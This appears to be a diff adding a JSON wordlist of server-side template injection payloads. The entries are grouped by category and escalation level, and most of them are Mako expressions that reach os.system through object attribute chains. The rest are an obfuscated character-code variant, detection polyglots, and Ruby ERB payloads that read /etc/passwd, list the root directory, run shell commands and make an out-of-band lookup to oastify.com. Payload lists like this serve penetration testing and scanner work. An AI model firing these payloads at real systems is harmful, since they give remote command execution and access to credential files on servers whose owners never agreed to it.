+        "${self.module.filters.compat.inspect.os.system(\"id\")}",
+        "${self.module.runtime.compat.inspect.os.system(\"id\")}",
+        "${self.module.runtime.exceptions.util.os.system(\"id\")}",
+        "${self.template.__init__.__globals__['os'].system('id')}",
+        "${self.module.cache.util.compat.inspect.os.system(\"id\")}",
+        "${self.module.runtime.util.compat.inspect.os.system(\"id\")}",
+        "${self.template._mmarker.module.cache.util.os.system(\"id\")}",
+        "${self.template.module.cache.compat.inspect.os.system(\"id\")}",
+        "${self.module.cache.compat.inspect.linecache.os.system(\"id\")}",
+        "${self.template._mmarker.module.runtime.util.os.system(\"id\")}",
+        "${self.attr._NSAttr__parent.module.cache.util.os.system(\"id\")}",
+        "${self.template.module.filters.compat.inspect.os.system(\"id\")}",
+        "${self.template.module.runtime.compat.inspect.os.system(\"id\")}",
+        "${self.module.filters.compat.inspect.linecache.os.system(\"id\")}",
+        "${self.module.runtime.compat.inspect.linecache.os.system(\"id\")}",
+        "${self.template.module.runtime.exceptions.util.os.system(\"id\")}",
+        "${self.attr._NSAttr__parent.module.runtime.util.os.system(\"id\")}",
+        "${self.context._with_template.module.cache.util.os.system(\"id\")}",
+        "${self.module.runtime.exceptions.compat.inspect.os.system(\"id\")}",
+        "${self.template.module.cache.util.compat.inspect.os.system(\"id\")}",
+        "${self.context._with_template.module.runtime.util.os.system(\"id\")}",
+        "${self.module.cache.util.compat.inspect.linecache.os.system(\"id\")}",
+        "${self.template.module.runtime.util.compat.inspect.os.system(\"id\")}",
+        "${self.module.runtime.util.compat.inspect.linecache.os.system(\"id\")}",
+        "${self.module.runtime.exceptions.traceback.linecache.os.system(\"id\")}",
+        "${self.module.runtime.exceptions.util.compat.inspect.os.system(\"id\")}",
+        "${self.template._mmarker.module.cache.compat.inspect.os.system(\"id\")}",
+        "${self.template.module.cache.compat.inspect.linecache.os.system(\"id\")}",
+        "${self.attr._NSAttr__parent.template.module.cache.util.os.system(\"id\")}",
+        "${self.template._mmarker.module.filters.compat.inspect.os.system(\"id\")}",
+        "${self.template._mmarker.module.runtime.compat.inspect.os.system(\"id\")}",
+        "${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(\"id\")}",
+        "${self.template._mmarker.module.runtime.exceptions.util.os.system(\"id\")}",
+        "${self.template.module.filters.compat.inspect.linecache.os.system(\"id\")}",
+        "${self.template.module.runtime.compat.inspect.linecache.os.system(\"id\")}",
+        "${self.attr._NSAttr__parent.template.module.runtime.util.os.system(\"id\")}",
+        "${self.context._with_template._mmarker.module.cache.util.os.system(\"id\")}",
+        "${self.template.module.runtime.exceptions.compat.inspect.os.system(\"id\")}",
+        "${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(\"id\")}",
+        "${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(\"id\")}",
+        "${self.context._with_template.module.cache.compat.inspect.os.system(\"id\")}",
+        "${self.module.runtime.exceptions.compat.inspect.linecache.os.system(\"id\")}",
+        "${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(\"id\")}",
+        "${self.context._with_template._mmarker.module.runtime.util.os.system(\"id\")}",
+        "${self.context._with_template.module.filters.compat.inspect.os.system(\"id\")}",
+        "${self.context._with_template.module.runtime.compat.inspect.os.system(\"id\")}",
+        "${self.context._with_template.module.runtime.exceptions.util.os.system(\"id\")}",
+        "${self.template.module.runtime.exceptions.traceback.linecache.os.system(\"id\")}",
+        ">>> print(Template(\"${self.module.cache.util.os}\").render())",
+        "<module 'os' from '/usr/local/lib/python3.10/os.py'>"
+      ]
+    },
+    {
+      "category": "Mako - Remote Command Execution with Obfuscation",
+      "escalation": "aggressive",
+      "lines": [
+        "${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}",
+        "<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}"
+      ]
+    },
+    {
+      "category": "Universal Detection Payloads",
+      "escalation": "baseline",
+      "lines": [
+        "${{<%[%'\"}}%\\.",
+        "{{ ... }}",
+        "${ ... }",
+        "<%= ... %>",
+        "{ ... }",
+        "{{= ... }}",
+        "{= ... }",
+        "\\n= ... \\n",
+        "*{ ... }",
+        "@{ ... }",
+        "@( ... )",
+        "7 * 7",
+        "(1/0).zxy.zxy"
+      ]
+    },
+    {
+      "category": "Manual Detection and Exploitation",
+      "escalation": "baseline",
+      "lines": [
+        "${{<%[%'\"}}%\\."
+      ]
+    },
+    {
+      "category": "Universal Payloads",
+      "escalation": "baseline",
+      "lines": [
+        "%x('id') # Rendered RCE",
+        "File.read(\"Y:/A:/\"+%x('id')) # Error-Based RCE",
+        "1/(system(\"id\")&&1||0) # Boolean-Based RCE",
+        "system(\"id && sleep 5\") # Time-Based RCE"
+      ]
+    },
+    {
+      "category": "Ruby - Basic injections",
+      "escalation": "baseline",
+      "lines": [
+        "<%= 7 * 7 %>"
+      ]
+    },
+    {
+      "category": "Ruby - Retrieve /etc/passwd",
+      "escalation": "baseline",
+      "lines": [
+        "<%= File.open('/etc/passwd').read %>"
+      ]
+    },
+    {
+      "category": "Ruby - List files and directories",
+      "escalation": "baseline",
+      "lines": [
+        "<%= Dir.entries('/') %>"
+      ]
+    },
+    {
+      "category": "Ruby - Remote Command execution",
+      "escalation": "baseline",
+      "lines": [
+        "<%=(`nslookup oastify.com`)%>",
+        "<%= system('cat /etc/passwd') %>",
+        "<%= `ls /` %>",
+        "<%= IO.popen('ls /').readlines()  %>",
+        "<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>",
+        "<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.862Z"
+}
